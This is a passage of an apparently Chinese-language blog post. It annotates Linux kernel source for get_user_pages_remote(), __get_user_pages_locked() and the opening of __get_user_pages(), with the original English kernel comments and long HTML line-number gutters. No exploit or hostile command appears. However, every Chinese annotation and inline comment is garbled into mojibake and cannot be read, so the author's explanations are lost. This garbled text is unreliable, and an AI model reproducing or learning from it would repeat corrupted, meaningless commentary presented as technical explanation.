class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_user_pages_remote() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:	the task_struct to use for page fault accounting, or</span><br><span class="hljs-comment"> *		NULL if faults are not to be recorded.</span><br><span class="hljs-comment"> * @mm:		mm_struct of target mm</span><br><span class="hljs-comment"> * @start:	starting user address</span><br><span class="hljs-comment"> * @nr_pages:	number of pages from start to pin</span><br><span class="hljs-comment"> * @write:	whether pages will be written to by the caller</span><br><span class="hljs-comment"> * @force:	whether to force access even when user mapping is currently</span><br><span class="hljs-comment"> *		protected (but never forces write access to shared mapping).</span><br><span class="hljs-comment"> * @pages:	array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *		Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *		only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:	array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *		Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held for read or write.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If write=0, the page must not be written to. If the page is written to,</span><br><span class="hljs-comment"> * set_page_dirty (or set_page_dirty_lock, as appropriate) must be called</span><br><span class="hljs-comment"> * after the page is finished with, and before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages is typically used for fewer-copy IO operations, to get a</span><br><span class="hljs-comment"> * handle on the memory by some means other than accesses via the user virtual</span><br><span class="hljs-comment"> * addresses. The pages may be submitted for DMA to devices or accessed via</span><br><span class="hljs-comment"> * their kernel linear mapping (via the kmap APIs). Care should be taken to</span><br><span class="hljs-comment"> * use the correct cache flushing APIs.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See also get_user_pages_fast, for performance critical applications.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages should be phased out in favor of</span><br><span class="hljs-comment"> * get_user_pages_locked|unlocked or get_user_pages_fast. Nothing</span><br><span class="hljs-comment"> * should use get_user_pages because it cannot pass</span><br><span class="hljs-comment"> * FAULT_FLAG_ALLOW_RETRY to handle_mm_fault.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	get_user_pages_remote()-ÊääÁî®Êà∑È°µÈù¢ÈîÅÂÆöÂú®ÂÜÖÂ≠ò‰∏≠</span><br><span class="hljs-comment">	@tskÔºöÁî®‰∫éËøõË°åÁº∫È°µÂºÇÂ∏∏ËÆ°Êï∞ÁöÑ‰ªªÂä°ÊèèËø∞Á¨¶ÔºåÂ¶ÇÊûúÊòØNULLÁöÑËØùÂ∞±‰∏çËøõË°åËÆ∞Êï∞</span><br><span class="hljs-comment">	@mmÔºöÁõÆÊ†áËôöÊãüÂÜÖÂ≠òÁ©∫Èó¥</span><br><span class="hljs-comment">	@startÔºöËµ∑ÂßãÁî®Êà∑Âú∞ÂùÄ</span><br><span class="hljs-comment">	@nr_pagesÔºö‰ªéstartÂºÄÂßãË¶ÅÈîÅÂÆöÂ§öÂ∞ëÈ°µÈù¢</span><br><span class="hljs-comment">	@writeÔºöËøô‰∫õË¶ÅÈîÅÂÆöÁöÑÈ°µÈù¢ÊòØÂê¶ÈúÄË¶ÅË¢´ÂÜôÂÖ•</span><br><span class="hljs-comment">	@forceÔºöÂΩìÁî®Êà∑Êò†Â∞ÑÊ≠£Âú®Ë¢´‰øùÊä§Êó∂ÔºåÁî®‰∫éÂ≠òÊîæÊåáÂêëË¢´ÈîÅÂÆöÁöÑpagesÁöÑÊåáÈíà</span><br><span class="hljs-comment">	@vmsÔºö‰∏Ä‰∏™VMAÊåáÈíàÊï∞ÁªÑÔºåÁî®‰∫éÂ≠òÊîæÊØè‰∏Ä‰∏™È°µÈù¢ÂØπÂ∫îÁöÑVMAÂØπË±°</span><br><span class="hljs-comment">	</span><br><span class="hljs-comment">	ËøîÂõûË¢´ÈîÅÂÆöÁöÑÈ°µÈù¢Êï∞ÈáèÔºåÊúâÂèØËÉΩÊØîËØ∑Ê±ÇÁöÑÂ∞ëÔºåÂ¶ÇÊûúÊòØ0ÊàñËÄÖË¥üÊï∞ÔºåÂ∞±Ë°®Á§∫Âá∫Èîô‰∫Ü</span><br><span class="hljs-comment">	pages‰∏≠ËøîÂõûÁöÑÊØè‰∏Ä‰∏™È°µÈù¢ÈÉΩÂøÖÈ°ªÈÄöËøáput_page()ËøõË°åÈáäÊîæ</span><br><span class="hljs-comment">	vmas‰∏≠ÁöÑÊåáÈíà‰ºö‰∏ÄÁõ¥ÊúâÊïàÔºåÁõ¥Âà∞mmap_semË¢´ÈáäÊîæ</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages_remote</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,</span><br><span class="hljs-params">		<span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,<br>				       pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>,<br>				       FOLL_TOUCH | FOLL_REMOTE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>get_user_pages_remote()</code>ÊòØÂØπ<code>__get_user_pages_locked()</code>ÁöÑÂåÖË£Ö</p>
<h4 id="get-user-pages-locked"><a href="#get-user-pages-locked" class="headerlink" title="__get_user_pages_locked()"></a>__get_user_pages_locked()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<span class="hljs-comment">//ËøõË°åÁº∫È°µËÆ°Êï∞ÁöÑ</span><br>						<span class="hljs-keyword">struct</span> mm_struct *mm,	<span class="hljs-comment">//ÁõÆÊ†áËôöÊãüÂÜÖÂ≠òÂú∞ÂùÄ</span><br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,	<span class="hljs-comment">//Ëµ∑ÂßãÂú∞ÂùÄ</span><br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,	<span class="hljs-comment">//ÈîÅÂÆöÂ§öÂ∞ëÈ°µ</span><br>						<span class="hljs-type">int</span> write, 			   <span class="hljs-comment">//ÊòØÂê¶ÈúÄË¶ÅÂÜôÂÖ•</span><br>                          <span class="hljs-type">int</span> force,			 <span class="hljs-comment">//ÊòØÂê¶Âº∫Âà∂ÈîÅÂÆö</span><br>						<span class="hljs-keyword">struct</span> page **pages,    <span class="hljs-comment">//ÈîÅÂÆöÈ°µÈù¢ÁöÑÊåáÈíàÊï∞ÁªÑ</span><br>						<span class="hljs-keyword">struct</span> vm_area_struct **vmas,	<span class="hljs-comment">//Ë¢´ÈîÅÂÆöÈ°µÈù¢ÂØπÂ∫îÁöÑVMAÊï∞ÁªÑÊåáÈíà</span><br>						<span class="hljs-type">int</span> *locked, 			<span class="hljs-comment">//ÊòØÂê¶‰ΩøÁî®VM_FAULT_RETRYÁöÑÂäüËÉΩÔºåËÆæ‰∏∫NULL</span><br>                          <span class="hljs-type">bool</span> notify_drop,		   <span class="hljs-comment">//‰∏çËøõË°åÈÄöÁü•ÔºåËÆæ‰∏∫false</span><br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)		<span class="hljs-comment">//Ê†áÂøó</span><br>&#123;<br>	<span class="hljs-type">long</span> ret, pages_done;<br>	<span class="hljs-type">bool</span> lock_dropped;<br><br>	<span class="hljs-keyword">if</span> (locked) &#123;<br>		<span class="hljs-comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span><br>		BUG_ON(vmas);<br>		<span class="hljs-comment">/* check caller initialized locked */</span><br>		BUG_ON(*locked != <span class="hljs-number">1</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (pages)<span class="hljs-comment">//Â¶ÇÊûúÈúÄË¶ÅËé∑ÂèñÈ°µÈù¢ÔºåËÆæÁΩÆFILL_GETÊ†áÂøó</span><br>		flags |= FOLL_GET;<br>	<span class="hljs-keyword">if</span> (write)<span class="hljs-comment">//Â¶ÇÊûúÈúÄË¶ÅÂÜôÂÖ•ÔºåËÆæÁΩÆFOLL_WRITEÊ†áÂøó</span><br>		flags |= FOLL_WRITE;<br>	<span class="hljs-keyword">if</span> (force)<span class="hljs-comment">//ÊòØÂê¶Âº∫Âà∂ÈîÅÂÆö</span><br>		flags |= FOLL_FORCE;<br><br>	pages_done = <span class="hljs-number">0</span>;<br>	lock_dropped = <span class="hljs-literal">false</span>;<br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>		ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br>				       vmas, locked);<br>		<span class="hljs-keyword">if</span> (!locked)<span class="hljs-comment">//Â¶ÇÊûúVM_FAULT_RETRYÊó†Ê≥ïËß¶ÂèëÔºåÂ∞±Áõ¥Êé•ËøîÂõû</span><br>			<span class="hljs-comment">/* VM_FAULT_RETRY couldn&#x27;t trigger, bypass */</span><br>			<span class="hljs-keyword">return</span> ret;<br><br>		<span class="hljs-comment">/* VM_FAULT_RETRY cannot return errors */</span><br>		<span class="hljs-keyword">if</span> (!*locked) &#123;<br>			BUG_ON(ret &lt; <span class="hljs-number">0</span>);<br>			BUG_ON(ret &gt;= nr_pages);<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!pages)<br>			<span class="hljs-comment">/* If it&#x27;s a prefault don&#x27;t insist harder */</span><br>			<span class="hljs-keyword">return</span> ret;<br><br>		<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>			nr_pages -= ret;<br>			pages_done += ret;<br>			<span class="hljs-keyword">if</span> (!nr_pages)<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (*locked) &#123;<br>			<span class="hljs-comment">/* VM_FAULT_RETRY didn&#x27;t trigger */</span><br>			<span class="hljs-keyword">if</span> (!pages_done)<br>				pages_done = ret;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span><br>		pages += ret;<br>		start += ret &lt;&lt; PAGE_SHIFT;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Repeat on the address that fired VM_FAULT_RETRY</span><br><span class="hljs-comment">		 * without FAULT_FLAG_ALLOW_RETRY but with</span><br><span class="hljs-comment">		 * FAULT_FLAG_TRIED.</span><br><span class="hljs-comment">		 */</span><br>		*locked = <span class="hljs-number">1</span>;<br>		lock_dropped = <span class="hljs-literal">true</span>;<br>		down_read(&amp;mm-&gt;mmap_sem);<br>		ret = __get_user_pages(tsk, mm, start, <span class="hljs-number">1</span>, flags | FOLL_TRIED,<br>				       pages, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (ret != <span class="hljs-number">1</span>) &#123;<br>			BUG_ON(ret &gt; <span class="hljs-number">1</span>);<br>			<span class="hljs-keyword">if</span> (!pages_done)<br>				pages_done = ret;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		nr_pages--;<br>		pages_done++;<br>		<span class="hljs-keyword">if</span> (!nr_pages)<br>			<span class="hljs-keyword">break</span>;<br>		pages++;<br>		start += PAGE_SIZE;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We must let the caller know we temporarily dropped the lock</span><br><span class="hljs-comment">		 * and so the critical section protected by it was lost.</span><br><span class="hljs-comment">		 */</span><br>		up_read(&amp;mm-&gt;mmap_sem);<br>		*locked = <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> pages_done;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Ë∞ÉÁî®Âà∞<code>__get_user_pages()</code></p>
<h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages()"></a>__get_user_pages()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * __get_user_pages() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:	task_struct of target task</span><br><span class="hljs-comment"> * @mm:		mm_struct of target mm</span><br><span class="hljs-comment"> * @start:	starting user address</span><br><span class="hljs-comment"> * @nr_pages:	number of pages from start to pin</span><br><span class="hljs-comment"> * @gup_flags:	flags modifying pin behaviour</span><br><span class="hljs-comment"> * @pages:	array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *		Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *		only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:	array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *		Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> * @nonblocking: whether waiting for disk IO or mmap_sem contention</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held.  It may be released.  See below.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * __get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * __get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @gup_flags &amp; FOLL_WRITE == 0, the page must not be written to. If</span><br><span class="hljs-comment"> * the page is written to, set_page_dirty (or set_page_dirty_lock, as</span><br><span class="hljs-comment"> * appropriate) must be called after the page is finished with, and</span><br><span class="hljs-comment"> * before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @nonblocking != NULL, __get_user_pages will not wait for disk IO</span><br><span class="hljs-comment"> * or mmap_sem contention, and if waiting is needed to pin all pages,</span><br><span class="hljs-comment"> * *@nonblocking will be set to 0.  Further, if @gup_flags does not</span><br><span class="hljs-comment"> * include FOLL_NOWAIT, the mmap_sem will be released via up_read() in</span><br><span class="hljs-comment"> * this case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A caller using such a combination of @nonblocking and @gup_flags</span><br><span class="hljs-comment"> * must therefore hold the mmap_sem for reading only, and recognize</span><br><span class="hljs-comment"> * when it&#x27;s been released.  Otherwise, it must be held for either</span><br><span class="hljs-comment"> * reading or writing and will not be released.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In most cases, get_user_pages or get_user_pages_fast should be used</span><br><span class="hljs-comment"> * instead of __get_user_pages. __get_user_pages should be used only if</span><br><span class="hljs-comment"> * you need some special @gup_flags.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*	</span><br><span class="hljs-comment">	__get_user_pages()-ÊääÁî®Êà∑È°µÈù¢Âõ∫ÂÆöÂú®ÂÜÖÂ≠ò‰∏≠</span><br><span class="hljs-comment">	@tskÔºöÁõÆÊ†áËøõÁ®ã</span><br><span class="hljs-comment">	@mmÔºöÁõÆÊ†áÂÜÖÂ≠òÁ©∫Èó¥</span><br><span class="hljs-comment">	@startÔºöËµ∑ÂßãÁî®Êà∑Âú∞ÂùÄ</span><br><span class="hljs-comment">	@nr_pagesÔºöÈîÅÂÆöÂ§öÂ∞ëÈ°µÈù¢</span><br><span class="hljs-comment">	@gup_flagsÔºöÊéßÂà∂get user pagesÁöÑË°å‰∏∫Ê†áÂøó</span><br><span class="hljs-comment">	@pagesÔºöÊé•ÂèóË¢´ÈîÅÂÆöÈ°µÈù¢ÊåáÈíàÁöÑÊåáÈíàÊï∞ÁªÑÔºåÊúÄÂ∞ëË¶ÅËÉΩ‰øùÂ≠ònr_pages‰∏™ÊåáÈíà</span><br><span class="hljs-comment">	@vmasÔºö‰∏Ä‰∏™VMAÊåáÈíàÊï∞ÁªÑÔºåÁî®‰∫éÂ≠òÊîæÊØè‰∏Ä‰∏™È°µÈù¢ÂØπÂ∫îÁöÑVMAÂØπË±°</span><br><span class="hljs-comment">	@nonblockingÔºöÊòØÂê¶Á≠âÂæÖÁ£ÅÁõòIOÊàñËÄÖmmap_semÁ´û‰∫â</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags, <span class="hljs-keyword">struct</span> page **pages,<br>		<span class="hljs-keyword">struct</span> vm_area_struct **vmas, <span class="hljs-type">int</span> *nonblocking)<br>&#123;<br>	<span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_mask;<span class="hljs-comment">//Ê†πÊçÆÈ°µÈù¢Â§ßÂ∞èËÆæÁΩÆÊé©Á†Å</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-keyword">if</span> (!nr_pages)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">		‚Äî‚ÄîÔºÅÔºÅpages:Á≠â‰ª∑‰∫épages!=0ÔºåË°®Á§∫pagesÊòØÂê¶‰∏∫‰∏Ä‰∏™ÈùûÁ©∫ÊåáÈíà</span><br><span class="hljs-comment">		‚Äî‚ÄîÔºÅÔºÅ(gup_flags &amp; FOLL_GET):Á≠â‰ª∑‰∫égup_flags &amp; FOLL_GETÔºÅ=0ÔºåÊ†áÂøóÊòØÂê¶ËÆæÁΩÆFOLL_GETÊ†áÂøó</span><br><span class="hljs-comment">		‚Äî‚ÄîÂè™Ë¶ÅËøô‰∏§‰∏™Êù°‰ª∂‰∏çÂÉèÁ≠âÂ∞±‰ºöÂá∫bug</span><br><span class="hljs-comment">			Ë¶Å‰πàpagesÊòØ‰∏™Á©∫ÊåáÈíàÔºågup_flagsÊ≤°ËÆæÁΩÆFOLL_GETÊ†áÂøóÔºå‰∏çÈúÄË¶ÅËé∑ÂèñÈ°µÈù¢</span><br><span class="hljs-comment">			Ë¶Å‰πàpagesÂ≠òÂú®Ôºågup_flagsËÆæÁΩÆ‰∫ÜFOLL_GETÊ†áÂøóÔºåÈúÄË¶ÅËé∑ÂèñÈ°µÈù¢*/</span><br>	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span><br><span class="hljs-comment">	 * fault information is unrelated to the reference behaviour of a task</span><br><span class="hljs-comment">	 * using the address space</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br>		gup_flags |= FOLL_NUMA;<br>    <br>	<span class="hljs-comment">//ÈÄöËøá‰∏Ä‰∏™do&#123;...&#125;while(nr_pages)Âæ™ÁéØ, 